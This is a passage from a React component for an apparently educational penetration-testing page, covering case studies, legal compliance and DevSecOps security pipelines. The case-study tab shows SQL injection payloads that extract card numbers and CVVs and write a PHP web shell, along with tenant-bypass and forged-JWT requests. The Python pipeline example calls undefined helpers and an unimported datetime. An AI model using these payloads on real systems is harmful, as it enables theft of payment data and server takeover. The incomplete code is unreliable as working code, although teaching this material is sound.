                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• Importance of secure coding practices</li>
                        <li>• Need for comprehensive input validation</li>
                        <li>• Regular security code reviews required</li>
                        <li>• Employee security awareness training gaps</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>

              <Separator />

              <div>
                <h4 className="text-lg font-semibold mb-3">Technical Deep Dive: SQL Injection Exploitation</h4>
                <CodeExample
                  language="sql"
                  code={`-- Discovery Phase
-- Initial parameter testing in payment processing endpoint
POST /api/payment/process HTTP/1.1
Content-Type: application/json

{
  "card_number": "4111111111111111",
  "amount": "100.00",
  "merchant_id": "12345'"
}

-- Error revealed MySQL syntax error, confirming SQL injection

-- Exploitation Phase
-- Union-based injection to extract sensitive data
{
  "merchant_id": "12345' UNION SELECT 1,2,3,user(),database(),version()-- "
}

-- Response revealed database structure and version
-- Further exploitation to extract payment data
{
  "merchant_id": "12345' UNION SELECT card_number,cvv,expiry_date FROM payment_cards LIMIT 10-- "
}

-- Privilege Escalation
-- Attempted to write web shell via SQL injection
{
  "merchant_id": "12345'; SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- "
}

-- Impact Assessment
-- Demonstrated ability to:
-- 1. Extract all customer payment information
-- 2. Modify transaction amounts
-- 3. Create unauthorized transactions
-- 4. Potentially gain server-level access`}
                  title="SQL Injection Exploitation Chain"
                />
              </div>

              <Separator />

              <div>
                <h4 className="text-lg font-semibold mb-3">Case Study 2: SaaS Platform Security Assessment</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-4">
                    <div>
                      <h5 className="font-medium mb-2">Multi-Tenant Security Issues</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• Tenant isolation bypass via subdomain enumeration</li>
                        <li>• Database-level tenant mixing in shared tables</li>
                        <li>• API endpoints lacking tenant validation</li>
                        <li>• Cross-tenant data access via IDOR</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-2">Authentication & Authorization Flaws</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• JWT token manipulation for privilege escalation</li>
                        <li>• Session fixation in SSO implementation</li>
                        <li>• Weak password reset token generation</li>
                        <li>• Missing rate limiting on authentication endpoints</li>
                      </ul>
                    </div>
                  </div>
                  <CodeExample
                    language="http"
                    code={`# Multi-Tenant Security Bypass Example

# 1. Subdomain enumeration revealed internal tenant
# GET https://internal-tenant.saas-platform.com

# 2. API endpoint tenant bypass
GET /api/v1/users?tenant_id=victim_tenant HTTP/1.1
Authorization: Bearer attacker_jwt_token
X-Tenant-ID: victim_tenant

# 3. Database-level tenant mixing
POST /api/v1/reports/generate HTTP/1.1
Content-Type: application/json
Authorization: Bearer valid_token

{
  "report_type": "user_activity",
  "tenant_filter": "../../../*",
  "include_all_tenants": true
}

# 4. JWT manipulation for privilege escalation
# Original JWT payload:
{
  "user_id": "12345",
  "tenant_id": "attacker_tenant",
  "role": "user",
  "permissions": ["read"]
}

# Modified JWT payload:
{
  "user_id": "12345", 
  "tenant_id": "victim_tenant",
  "role": "admin",
  "permissions": ["read", "write", "delete", "admin"]
}`}
                    title="Multi-Tenant Bypass"
                  />
                </div>
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Legal & Compliance */}
        <TabsContent value="legal-compliance" className="mt-6 space-y-6">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Lock className="h-5 w-5" />
                Legal Framework & Compliance
              </CardTitle>
              <CardDescription>
                Legal considerations, compliance requirements, and ethical guidelines for professional penetration testing
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div>
                <h4 className="text-lg font-semibold mb-3">Legal Documentation Requirements</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-4">
                    <div>
                      <h5 className="font-medium mb-2">Pre-Engagement Documentation</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• Non-Disclosure Agreement (NDA)</li>
                        <li>• Statement of Work (SOW)</li>
                        <li>• Rules of Engagement (RoE)</li>
                        <li>• Liability and Indemnification clauses</li>
                        <li>• Emergency contact procedures</li>
                        <li>• Scope definition and boundaries</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-2">Regulatory Compliance Frameworks</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• PCI DSS: Payment card industry requirements</li>
                        <li>• HIPAA: Healthcare information protection</li>
                        <li>• SOX: Financial reporting compliance</li>
                        <li>• GDPR: Data protection and privacy</li>
                        <li>• ISO 27001: Information security management</li>
                      </ul>
                    </div>
                  </div>
                  <div className="space-y-4">
                    <div>
                      <h5 className="font-medium mb-2">International Legal Considerations</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• <strong>US:</strong> Computer Fraud and Abuse Act (CFAA)</li>
                        <li>• <strong>UK:</strong> Computer Misuse Act 1990</li>
                        <li>• <strong>EU:</strong> Network and Information Security Directive</li>
                        <li>• <strong>Canada:</strong> Personal Information Protection Act</li>
                        <li>• Cross-border data transfer restrictions</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-2">Ethical Guidelines</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• Principle of least privilege testing</li>
                        <li>• Data confidentiality and integrity</li>
                        <li>• Responsible disclosure practices</li>
                        <li>• Client data protection measures</li>
                        <li>• Professional conduct standards</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>

              <Separator />

              <div>
                <h4 className="text-lg font-semibold mb-3">Risk Management & Liability</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-4">
                    <div>
                      <h5 className="font-medium mb-2">Risk Assessment Matrix</h5>
                      <div className="space-y-2">
                        <div className="flex justify-between p-2 bg-red-500/10 rounded">
                          <span className="text-red-600 font-medium">Critical Risk</span>
                          <span className="text-sm">System compromise, data breach</span>
                        </div>
                        <div className="flex justify-between p-2 bg-orange-500/10 rounded">
                          <span className="text-orange-600 font-medium">High Risk</span>
                          <span className="text-sm">Service disruption, unauthorized access</span>
                        </div>
                        <div className="flex justify-between p-2 bg-yellow-500/10 rounded">
                          <span className="text-yellow-600 font-medium">Medium Risk</span>
                          <span className="text-sm">Information disclosure, privilege escalation</span>
                        </div>
                        <div className="flex justify-between p-2 bg-green-500/10 rounded">
                          <span className="text-green-600 font-medium">Low Risk</span>
                          <span className="text-sm">Minor configuration issues</span>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div className="space-y-4">
                    <div>
                      <h5 className="font-medium mb-2">Insurance & Professional Protection</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• Professional liability insurance coverage</li>
                        <li>• Errors and omissions (E&O) insurance</li>
                        <li>• Cyber liability insurance for data breaches</li>
                        <li>• Legal defense cost coverage</li>
                        <li>• Business interruption protection</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-2">Incident Response Procedures</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• Immediate notification protocols</li>
                        <li>• Evidence preservation procedures</li>
                        <li>• Client communication guidelines</li>
                        <li>• Legal counsel engagement process</li>
                        <li>• Regulatory reporting requirements</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* DevSecOps Integration */}
        <TabsContent value="devsecops" className="mt-6 space-y-6">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Code className="h-5 w-5" />
                DevSecOps Integration
              </CardTitle>
              <CardDescription>
                Integrating security testing into development pipelines and CI/CD processes
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div>
                <h4 className="text-lg font-semibold mb-3">CI/CD Security Integration</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <CodeExample
                    language="yaml"
                    code={`# GitLab CI/CD Security Pipeline
stages:
  - build
  - test
  - security
  - deploy

# Static Application Security Testing (SAST)
sast:
  stage: security
  script:
    - semgrep --config=auto --json --output=sast-results.json src/
    - bandit -r src/ -f json -o bandit-results.json
    - sonarqube-scanner
  artifacts:
    reports:
      sast: sast-results.json
    expire_in: 1 week

# Dynamic Application Security Testing (DAST)
dast:
  stage: security
  script:
    - docker run --rm -v $(pwd):/zap/wrk/:rw \\
        owasp/zap2docker-stable zap-baseline.py \\
        -t $APPLICATION_URL -g gen.conf -r dast-report.html
  artifacts:
    reports:
      dast: dast-report.html
    expire_in: 1 week

# Container Security Scanning
container_scan:
  stage: security
  script:
    - trivy image --format json --output container-scan.json $CI_REGISTRY_IMAGE
  artifacts:
    reports:
      container_scanning: container-scan.json`}
                    title="GitLab CI/CD Security"
                  />
                  <CodeExample
                    language="yaml"
                    code={`# GitHub Actions Security Workflow
name: Security Testing
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2
    
    # SAST with CodeQL
    - name: Initialize CodeQL
      uses: github/codeql-action/init@v1
      with:
        languages: javascript, python
    
    - name: Autobuild
      uses: github/codeql-action/autobuild@v1
      
    - name: Perform CodeQL Analysis
      uses: github/codeql-action/analyze@v1

    # Dependency Scanning
    - name: Run Snyk to check for vulnerabilities
      uses: snyk/actions/node@master
      env:
        SNYK_TOKEN: \${{ secrets.SNYK_TOKEN }}
      with:
        args: --severity-threshold=high
    
    # Secret Scanning
    - name: Secret Scanning
      run: |
        docker run --rm -v "$PWD:/pwd" \\
          trufflesecurity/trufflehog:latest git \\
          file:///pwd --only-verified
    
    # Infrastructure as Code Scanning
    - name: Checkov IaC Scan
      uses: bridgecrewio/checkov-action@master
      with:
        directory: ./terraform
        framework: terraform`}
                    title="GitHub Actions Security"
                  />
                </div>
              </div>

              <Separator />

              <div>
                <h4 className="text-lg font-semibold mb-3">Security as Code Implementation</h4>
                <CodeExample
                  language="python"
                  code={`#!/usr/bin/env python3
"""
Security as Code - Automated Security Testing Framework
Integrates multiple security tools in development pipeline
"""

import subprocess
import json
import sys
from pathlib import Path

class SecurityPipeline:
    def __init__(self, project_path, config_file="security-config.json"):
        self.project_path = Path(project_path)
        self.config = self.load_config(config_file)
        self.results = {}
    
    def load_config(self, config_file):
        """Load security testing configuration"""
        with open(config_file) as f:
            return json.load(f)
    
    def run_sast(self):
        """Run Static Application Security Testing"""
        print("Running SAST...")
        
        # Semgrep for multiple languages
        semgrep_cmd = [
            "semgrep", "--config=auto", "--json", 
            "--output=sast-semgrep.json", str(self.project_path)
        ]
        subprocess.run(semgrep_cmd, check=True)
        
        # Bandit for Python
        if any(self.project_path.glob("**/*.py")):
            bandit_cmd = [
                "bandit", "-r", str(self.project_path), 
                "-f", "json", "-o", "sast-bandit.json"
            ]
            subprocess.run(bandit_cmd)
        
        # ESLint Security Plugin for JavaScript
        if any(self.project_path.glob("**/*.js")):
            eslint_cmd = [
                "eslint", str(self.project_path), 
                "--ext", ".js,.jsx,.ts,.tsx",
                "--format", "json", 
                "--output-file", "sast-eslint.json"
            ]
            subprocess.run(eslint_cmd)
    
    def run_dependency_check(self):
        """Check for vulnerable dependencies"""
        print("Running dependency security check...")
        
        # Safety for Python dependencies
        if (self.project_path / "requirements.txt").exists():
            safety_cmd = ["safety", "check", "--json", "--output", "deps-safety.json"]
            subprocess.run(safety_cmd)
        
        # npm audit for Node.js
        if (self.project_path / "package.json").exists():
            npm_cmd = ["npm", "audit", "--json"]
            result = subprocess.run(npm_cmd, capture_output=True, text=True)
            with open("deps-npm.json", "w") as f:
                f.write(result.stdout)
    
    def run_secret_scan(self):
        """Scan for secrets and credentials"""
        print("Running secret scanning...")
        
        # TruffleHog for git repositories
        if (self.project_path / ".git").exists():
            trufflehog_cmd = [
                "docker", "run", "--rm", "-v", f"{self.project_path}:/pwd",
                "trufflesecurity/trufflehog:latest", "git", 
                "file:///pwd", "--json"
            ]
            result = subprocess.run(trufflehog_cmd, capture_output=True, text=True)
            with open("secrets-trufflehog.json", "w") as f:
                f.write(result.stdout)
    
    def run_infrastructure_scan(self):
        """Scan Infrastructure as Code"""
        print("Running IaC security scanning...")
        
        # Checkov for multiple IaC formats
        iac_files = list(self.project_path.glob("**/*.tf")) + \\
                   list(self.project_path.glob("**/*.yaml")) + \\
                   list(self.project_path.glob("**/*.yml"))
        
        if iac_files:
            checkov_cmd = [
                "checkov", "-d", str(self.project_path), 
                "--output", "json", "--output-file", "iac-checkov.json"
            ]
            subprocess.run(checkov_cmd)
    
    def generate_security_report(self):
        """Generate comprehensive security report"""
        print("Generating security report...")
        
        # Aggregate all results
        report_data = {
            "timestamp": datetime.now().isoformat(),
            "project": str(self.project_path),
            "sast_results": self.load_json_file("sast-semgrep.json"),
            "dependency_results": self.load_json_file("deps-safety.json"),
            "secret_results": self.load_json_file("secrets-trufflehog.json"),
            "iac_results": self.load_json_file("iac-checkov.json")
        }
        
        # Calculate risk score
        risk_score = self.calculate_risk_score(report_data)
        report_data["risk_score"] = risk_score
        
        # Generate HTML report
        html_report = self.create_html_report(report_data)
        with open("security-report.html", "w") as f:
            f.write(html_report)
        
        return risk_score
    
    def calculate_risk_score(self, report_data):
        """Calculate overall security risk score"""
        score = 0
        
        # SAST findings
        if report_data.get("sast_results"):
            for finding in report_data["sast_results"].get("results", []):
                severity = finding.get("extra", {}).get("severity", "INFO")
                if severity == "ERROR": score += 10
                elif severity == "WARNING": score += 5
                elif severity == "INFO": score += 1
        
        # Dependency vulnerabilities
        if report_data.get("dependency_results"):
            vulnerabilities = report_data["dependency_results"].get("vulnerabilities", [])
            score += len(vulnerabilities) * 3
        
        # Secrets found
        if report_data.get("secret_results"):
            secrets = json.loads(report_data["secret_results"]) if isinstance(report_data["secret_results"], str) else []
            score += len(secrets) * 15
        
        return min(score, 100)  # Cap at 100
    
    def run_full_pipeline(self):
        """Execute complete security pipeline"""
        try:
            self.run_sast()
            self.run_dependency_check()
            self.run_secret_scan()
            self.run_infrastructure_scan()
            risk_score = self.generate_security_report()
            
            # Fail build if risk score is too high
            if risk_score > self.config.get("max_risk_score", 50):
                print(f"Security check failed: Risk score {risk_score} exceeds threshold")
                sys.exit(1)
            
            print(f"Security check passed: Risk score {risk_score}")
            return True
            
        except Exception as e:
            print(f"Security pipeline failed: {e}")
            sys.exit(1)

# Usage in CI/CD pipeline
if __name__ == "__main__":
    pipeline = SecurityPipeline(".")
    pipeline.run_full_pipeline()`}
                  title="Security as Code Framework"
                />
              </div>
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  );
};

export default AdvancedContentSection;
